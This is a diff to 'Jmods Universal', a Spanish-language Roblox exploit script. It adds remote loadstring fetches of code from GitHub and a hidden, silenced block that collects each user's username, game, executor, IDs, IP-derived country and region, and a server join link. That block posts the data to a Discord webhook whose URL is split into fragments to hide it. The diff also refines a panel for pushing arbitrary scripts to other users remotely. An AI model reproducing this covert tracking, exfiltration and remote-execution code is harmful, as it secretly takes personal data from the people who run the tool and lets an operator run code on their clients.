@@ -1,3 +1,322 @@
+
+local Rayfield = loadstring(game:HttpGet('https://raw.githubusercontent.com/pruebasjoao/test/refs/heads/main/JmodsLibV1.0'))()
+_G.Rayfield = Rayfield
+-- Crear ventana
+local Window = Rayfield:CreateWindow({
+    Name = "Jmods Universal",
+    Icon = 127271155083726,
+    LoadingTitle = "Subscribete: joao_mods",
+    LoadingSubtitle = "Cargando Jmods universal....",
+Intro = true,
+AnimationIntro = 5,
+OpenButtomImage = 91756317750919,
+DragImage = 127271155083726,
+Theme = "Oscuro",
+HideCloseButton = true,
+
+    DisableRayfieldPrompts = true,
+    DisableBuildWarnings = false,
+    ConfigurationSaving = {
+        Enabled = true,
+        FolderName = "JmodsUniversal",
+        FileName = "joao_mods"
+    },
+    Discord = {
+        Enabled = true,
+        Invite = "4gGUz2tk",
+        RememberJoins = false
+    },
+    KeySystem = false,
+    KeySettings = {
+        Title = "Jmods Universal",
+        Subtitle = "Mantenimiento",
+Note = "Falta poco. Más info en mi Discord: discord.gg/4bzTyQBBnt",
+        FileName = "key",
+        SaveKey = false,
+        GrabKeyFromSite = false,
+        Key = {"keymanxd"}
+    }
+})
+
+
+
+
+-------Wea de owner
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/JoaoMods26/mods/refs/heads/main/Remote'))()
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+--[[
+-- FUNCIONES DE TEMA
+local themeSavePath = "JmodsUniversal/SelectedTheme.txt"
+
+-- Guardar el tema
+local function SaveTheme(themeName)
+    if not isfile(themeSavePath) then
+        makefolder("JmodsUniversal")
+    end
+    writefile(themeSavePath, themeName)
+
+end
+
+-- Cargar el tema guardado
+local function LoadSavedTheme()
+    local validThemes = {
+        ["Light"] = true,
+        ["Dark"] = true,
+        ["Aqua"] = true,
+        ["Jester"] = true,
+        ["Moon"] = true,
+        ["Synapse"] = true,
+        ["Sentinel"] = true,
+        ["Midnight"] = true,
+        ["Serpent"] = true,
+        ["Bloom"] = true,
+        ["Discord"] = true,
+        ["Default"] = true, -- Asegúrate de que todos los temas sean válidos
+        ["AmberGlow"] = true,
+        ["Amethyst"] = true,
+        ["DarkBlue"] = true,
+        ["Green"] = true,
+        ["Ocean"] = true,
+        ["Serenity"] = true,
+    }
+
+    if isfile(themeSavePath) then
+        local theme = readfile(themeSavePath)
+
+        if validThemes[theme] then
+
+            Window.ModifyTheme(theme)
+        else
+            warn("Tema inválido:", theme)
+            Window.ModifyTheme("Bloom")  -- Tema por defecto
+        end
+    else
+        print("No se encontró el archivo de tema, cargando el predeterminado...")
+        Window.ModifyTheme("Bloom")  -- Tema por defecto
+    end
+end
+
+-- Cargar tema guardado al inicio
+LoadSavedTheme()
+
+]]
+-----
+
+
+
+
+-----
+------
+------
+
+
+-- [[ Notificación + WHID Check - Jmods Universal ]] --
+
+
+
+task.delay(0.3, function()
+    local success, err = pcall(function()
+        local HttpService = game:GetService("HttpService")
+        local CoreGui = game:GetService("CoreGui")
+        local player = game.Players.LocalPlayer
+        local placeName = "Juego desconocido"
+        local ejecutador = "Desconocido"
+        local jobId = game.JobId
+        local userId = player.UserId
+        local whid = tostring(userId) .. "-" .. string.sub(jobId, 1, 8)
+
+        -- Lista de WHIDs bloqueados directamente en el script (añade los que necesites)
+        local blockedWHIDs = {
+            --["12345678-abcdef12"] = true,
+            --["otroWHID"] = true,
+        }
+
+        if blockedWHIDs[whid] then
+            warn("WHID bloqueado: " .. whid)
+            local hiddenUI = CoreGui:FindFirstChild("HiddenUI")
+            if hiddenUI then
+                hiddenUI:Destroy()
+            end
+            return
+        end
+
+        local joinLink = "roblox://experiences/start?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. jobId
+        local webLink = "https://www.roblox.com/games/" .. game.PlaceId
+
+        pcall(function()
+            placeName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
+        end)
+
+        pcall(function()
+            ejecutador = identifyexecutor and identifyexecutor() or (getexecutorname and getexecutorname()) or "Otro"
+        end)
+
+        -- Mapeo de códigos de país a nombres completos
+        local countryNames = {
+            AF = "Afganistán", AL = "Albania", DZ = "Argelia", AD = "Andorra", AO = "Angola",
+            AR = "Argentina", AM = "Armenia", AU = "Australia", AT = "Austria", AZ = "Azerbaiyán",
+            BS = "Bahamas", BD = "Bangladés", BE = "Bélgica", BO = "Bolivia", BR = "Brasil",
+            BG = "Bulgaria", CA = "Canadá", CL = "Chile", CN = "China", CO = "Colombia",
+            CR = "Costa Rica", HR = "Croacia", CU = "Cuba", CZ = "Chequia", DK = "Dinamarca",
+            DO = "República Dominicana", EC = "Ecuador", EG = "Egipto", SV = "El Salvador",
+            EE = "Estonia", FI = "Finlandia", FR = "Francia", GE = "Georgia", DE = "Alemania",
+            GR = "Grecia", GT = "Guatemala", HN = "Honduras", HU = "Hungría", IS = "Islandia",
+            IN = "India", ID = "Indonesia", IR = "Irán", IE = "Irlanda", IL = "Israel",
+            IT = "Italia", JP = "Japón", KZ = "Kazajistán", KR = "Corea del Sur", MX = "México",
+            MD = "Moldavia", MA = "Marruecos", NL = "Países Bajos", NZ = "Nueva Zelanda",
+            NI = "Nicaragua", NG = "Nigeria", NO = "Noruega", PA = "Panamá", PY = "Paraguay",
+            PE = "Perú", PH = "Filipinas", PL = "Polonia", PT = "Portugal", RO = "Rumanía",
+            RU = "Rusia", SA = "Arabia Saudita", RS = "Serbia", SG = "Singapur", SK = "Eslovaquia",
+            SI = "Eslovenia", ZA = "Sudáfrica", ES = "España", SE = "Suecia", CH = "Suiza",
+            TH = "Tailandia", TR = "Turquía", UA = "Ucrania", AE = "Emiratos Árabes Unidos",
+            GB = "Reino Unido", US = "Estados Unidos", UY = "Uruguay", VE = "Venezuela", VN = "Vietnam"
+        }
+
+        local country = "Desconocido"
+        local region = "Desconocido"
+
+        local ipinfoReq = (syn and syn.request) or (http_request) or (request) or (http and http.request)
+        if ipinfoReq then
+            local ok, geoResponse = pcall(function()
+                return ipinfoReq({
+                    Url = "https://ipinfo.io/json",
+                    Method = "GET"
+                })
+            end)
+
+            if ok and geoResponse and geoResponse.StatusCode == 200 then
+                local geoData
+                local decodeOk, decodeErr = pcall(function()
+                    geoData = HttpService:JSONDecode(geoResponse.Body)
+                end)
+                if decodeOk and geoData then
+                    local countryCode = geoData.country or "Desconocido"
+                    country = countryNames[countryCode] and (countryNames[countryCode] .. " - " .. countryCode) or countryCode
+                    region = geoData.region or "Desconocido"
+                end
+            end
+        end
+
+        local folderName = "Jmods_NotifyFlag"
+        if not CoreGui:FindFirstChild(folderName) then
+            local flag = Instance.new("Folder")
+            flag.Name = folderName
+            flag.Parent = CoreGui
+
+            local embedData = {
+                title = "✅ Jmods Universal",
+                color = tonumber("FFC0CB", 16),
+                thumbnail = {
+                    url = "https://www.roblox.com/asset-thumbnail/image?assetId=" .. game.PlaceId .. "&width=420&height=420&format=png"
+                },
+                footer = {
+                    text = "Jmods Universal",
+                    icon_url = ""
+                },
+                fields = { {
+                    name = "📌 Información",
+                    value = "👤 Usuario: " .. player.Name .. " @" .. player.DisplayName .. "" ..
+                            "\n🎮 Juego: " .. placeName ..
+                            "\n🧠 Ejecutador: " .. ejecutador ..
+                            "\n🆔 WHID: `" .. whid .. "`" ..
+                            "\n||🌍 País: " .. country .. "||" ..
+                            "\n||🏙️ Región: " .. region .. "||" ..
+                            "\n🕒 Hora: " .. os.date("%Y-%m-%d %H:%M:%S") ..
+                            "\n🌐 [Ver juego en la web](" .. webLink .. ")" ..
+                            "\n🔗 Unirse al servidor:\n```" .. joinLink .. "```",
+                    inline = true
+                }},
+                timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+            }
+
+            local jsonData = HttpService:JSONEncode({embeds = {embedData}})
+
+            local link = "https://dis" .. "cord." .. "com/a" .. "pi/webh" .. "ooks/" .. "144074" .. "7864" .. "648061039" .. "/CXp3JpoIZ_lwwGKLp_IWkbxa6R" .. "1ht2u6VZD" .. "qDa4AX5UO4rXR89" .. "mCKO" .. "Ct4Lk-N0E" .. "usUDH"
+
+            local req = (syn and syn.request) or (http_request) or (request) or (http and http.request)
+            if req then
+                local ok2, resp = pcall(function()
+                    return req({
+                        Url = link,
+                        Method = "POST",
+                        Headers = {
+                            ["Content-Type"] = "application/json"
+                        },
+                        Body = jsonData
+                    })
+                end)
+                if not ok2 then
+                 --   warn("Error al enviar webhook (pcall):", resp)
+                else
+                    if resp and (resp.StatusCode == 204 or resp.StatusCode == 200) then
+                     --   warn("Webhook enviado correctamente:", resp.StatusCode)
+                    else
+                     --   warn("Respuesta webhook inesperada:", resp and resp.StatusCode or "nil")
+                    end
+                end
+            else
+             --   warn("El ejecutador no soporta requests; webhook no enviado.")
+            end
+        end
+    end)
+
+    if not success then
+        -- silencioso
+    end
+end)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+-- SECCIÓN PRINCIPAL
+MainTab = Window:CreateTab("Principal", nil) -- Title, Image
+_G.MainTab = MainTab
+MainSection = MainTab:CreateSection("Main")
+
+
+
+
+
+
+---Chat HAKER----
+
+-- JXNULL CHAT GLOBAL V2 - SISTEMA DE ADMIN REMOTO CORREGIDO
 -- JXNULL CHAT GLOBAL V2 - SISTEMA DE ADMIN REMOTO CORREGIDO
 -- Sistema de carpetas
 if makefolder and not isfolder("JXNULL_CONFIGS") then
@@ -523,7 +842,7 @@ end)
     executeBtn.Size = UDim2.new(1, 0, 0, isMobile and 40 or 45)
     executeBtn.Position = UDim2.new(0, 0, 1, -(isMobile and 45 or 50))
     executeBtn.BackgroundColor3 = Color3.fromRGB(220, 53, 69)
-    executeBtn.Text = "🔥 EJECUTAR REMOTAMENTE"
+    executeBtn.Text = "🔥 EJECUTAR"
     executeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
     executeBtn.Font = Enum.Font.GothamBold
     executeBtn.TextSize = isMobile and 13 or 15
@@ -534,42 +853,48 @@ end)
     local executeCorner = Instance.new("UICorner", executeBtn)
     executeCorner.CornerRadius = UDim.new(0, 8)
     
-    executeBtn.MouseButton1Click:Connect(function()
+
+
+
+
+
+
+executeBtn.MouseButton1Click:Connect(function()
         local target = targetInput.Text:gsub("^%s*(.-)%s*$", "%1")
         local script = scriptInput.Text:gsub("^%s*(.-)%s*$", "%1")
         
-if target == "" then
-    executeBtn.Text = "❌ USA .all o .s"
-    task.wait(1.5)
-    executeBtn.Text = "🔥 EJECUTAR REMOTAMENTE"
-    return
-end
+        if target == "" then
+            executeBtn.Text = "❌ USA .all o .s"
+            task.wait(1.5)
+            executeBtn.Text = "🔥 EJECUTAR REMOTAMENTE"
+            return
+        end
 
--- Validar comandos válidos
-local targetLower = target:lower()
-local esComandoValido = (targetLower == ".all") or 
-                        (targetLower == ".s") or 
-                        (not target:find("^%.")) -- nombre de usuario sin punto
+        -- Validar comandos válidos
+        local targetLower = target:lower()
+        local esComandoValido = (targetLower == ".all") or 
+                                (targetLower == ".s") or 
+                                (not target:find("^%.")) -- nombre de usuario sin punto
 
-if not esComandoValido then
-    executeBtn.Text = "❌ COMANDO INVÁLIDO"
-    task.wait(1.5)
-    executeBtn.Text = "🔥 EJECUTAR REMOTAMENTE"
-    return
-end
+        if not esComandoValido then
+            executeBtn.Text = "❌ COMANDO INVÁLIDO"
+            task.wait(1.5)
+            executeBtn.Text = "🔥 EJECUTAR REMOTAMENTE"
+            return
+        end
 
-if script == "" then
-    executeBtn.Text = "❌ FALTA SCRIPT"
-    task.wait(1.5)
-    executeBtn.Text = "🔥 EJECUTAR REMOTAMENTE"
-    return
-end
+        if script == "" then
+            executeBtn.Text = "❌ FALTA SCRIPT"
+            task.wait(1.5)
+            executeBtn.Text = "🔥 EJECUTAR REMOTAMENTE"
+            return
+        end
         
-executeBtn.Text = "⏳ ENVIANDO..."
-        
-     --   print("📤 [DEBUG] Enviando comando remoto...")
-   --     print("🎯 [DEBUG] Target:", target)
-    --    print("📜 [DEBUG] Script:", script:sub(1, 50) .. "...")
+        -- ✅ NO borrar los campos, solo deshabilitar temporalmente
+        executeBtn.Text = "⏳ ENVIANDO..."
+        executeBtn.Active = false
+        targetInput.Active = false
+        scriptInput.Active = false
         
         local commandData = {
             admin = player.Name,
@@ -581,35 +906,72 @@ executeBtn.Text = "⏳ ENVIANDO..."
         
         local json = HttpService:JSONEncode(commandData)
         
-        local success, response = pcall(function()
-            return request({
-                Url = remoteCommandsURL,
-                Method = "POST",
-                Headers = { ["Content-Type"] = "application/json" },
-                Body = json
-            })
+        task.spawn(function()
+            local success, response = pcall(function()
+                return request({
+                    Url = remoteCommandsURL,
+                    Method = "POST",
+                    Headers = { ["Content-Type"] = "application/json" },
+                    Body = json
+                })
+            end)
+            
+            if success then
+                executeBtn.Text = "✅ ENVIADO"
+                task.wait(1)
+            else
+                warn("❌ [DEBUG] Error al enviar comando:", response)
+                executeBtn.Text = "❌ ERROR AL ENVIAR"
+                task.wait(1.5)
+            end
+            
+            -- ✅ Reactivar los campos SIN borrar el contenido
+            executeBtn.Text = "🔥 EJECUTAR REMOTAMENTE"
+            executeBtn.Active = true
+            targetInput.Active = true
+            scriptInput.Active = true
         end)
-        
-        if success then
-         --   print("✅ [DEBUG] Comando enviado exitosamente a Firebase")
-            executeBtn.Text = "✅ ENVIADO"
-            targetInput.Text = ""
-            scriptInput.Text = ""
-            task.wait(1.5)
-            executeBtn.Text = "🔥 EJECUTAR REMOTAMENTE"
-        else
-            warn("❌ [DEBUG] Error al enviar comando:", response)
-            executeBtn.Text = "❌ ERROR AL ENVIAR"
-            task.wait(1.5)
-            executeBtn.Text = "🔥 EJECUTAR REMOTAMENTE"
-        end
+    end)
+
+
+
+    
+-- ✅ NUEVO: Botón para limpiar campos
+    local clearBtn = Instance.new("TextButton")
+    clearBtn.Name = "ClearButton"
+    clearBtn.Size = UDim2.new(0.48, -2, 0, isMobile and 40 or 45)
+    clearBtn.Position = UDim2.new(0.52, 2, 1, -(isMobile and 45 or 50))
+    clearBtn.BackgroundColor3 = Color3.fromRGB(255, 193, 7)
+    clearBtn.Text = "🧹 LIMPIAR"
+    clearBtn.TextColor3 = Color3.fromRGB(20, 20, 25)
+    clearBtn.Font = Enum.Font.GothamBold
+    clearBtn.TextSize = isMobile and 13 or 15
+    clearBtn.BorderSizePixel = 0
+    clearBtn.ZIndex = 32
+    clearBtn.Parent = contentFrame
+    
+    local clearCorner = Instance.new("UICorner", clearBtn)
+    clearCorner.CornerRadius = UDim.new(0, 8)
+    
+    clearBtn.MouseButton1Click:Connect(function()
+        targetInput.Text = ""
+        scriptInput.Text = ""
+        clearBtn.Text = "✅ LIMPIADO"
+        task.wait(0.8)
+        clearBtn.Text = "🧹 LIMPIAR"
     end)
     
+    -- ✅ Ajustar tamaño del botón ejecutar para que quepa el de limpiar
+    executeBtn.Size = UDim2.new(0.48, -2, 0, isMobile and 40 or 45)
+    executeBtn.Position = UDim2.new(0, 0, 1, -(isMobile and 45 or 50))
+
     remoteExecutionPanel.Size = UDim2.new(0, 0, 0, 0)
     TweenService:Create(remoteExecutionPanel, TweenInfo.new(0.3, Enum.EasingStyle.Back), {
         Size = UDim2.new(0, panelWidth, 0, panelHeight)
     }):Play()
 end
+
+
 
 
 
